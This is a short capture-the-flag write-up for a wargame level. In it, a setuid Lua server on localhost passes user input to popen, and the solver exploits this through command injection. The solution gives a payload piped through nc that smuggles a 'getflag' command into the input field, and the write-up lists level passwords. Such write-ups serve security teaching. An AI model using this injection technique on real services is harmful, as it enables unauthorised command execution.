# Solve Level11
pass : feulo4b72j7edeahuete3no7c

## Description
- home
    - -rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua*

### level11.lua
- Try to execute but error : address already in use
  - ```ss -ln``` find 127.0.0.1:5151 is already used
    - the server is already start
      - ```curl localhost:5151``` ==> works
      - us nc instead of curl ```echo "useless;getflag > /tmp/lpo; something" | nc localhost 5151```
- The server listen for a var called 'l' and compare his checksum [sha1sum][df1] with a hard coded value.
  - according to wikipedia "The SHA-1 variants are proven vulnerable to [collision attacks][df2]"
    - looks like this type of attacks are to hard/expensive for us [last paper on collision in sha1][df3]
- find a vulnerability on popen which can be exploit with command injection 

## Solution
```bash
echo "useless;getflag > /tmp/lpo; something" | nc localhost 5151
cat /tmp/lpo
```

- flag11 : 
- level12 : fa6v5ateaw21peobuub8ipe6s


## Resolve problem


[df1]: https://en.wikipedia.org/wiki/Sha1sum
[df2]: https://en.wikipedia.org/wiki/Collision_attack
[df3]: https://eprint.iacr.org/2020/014.pdf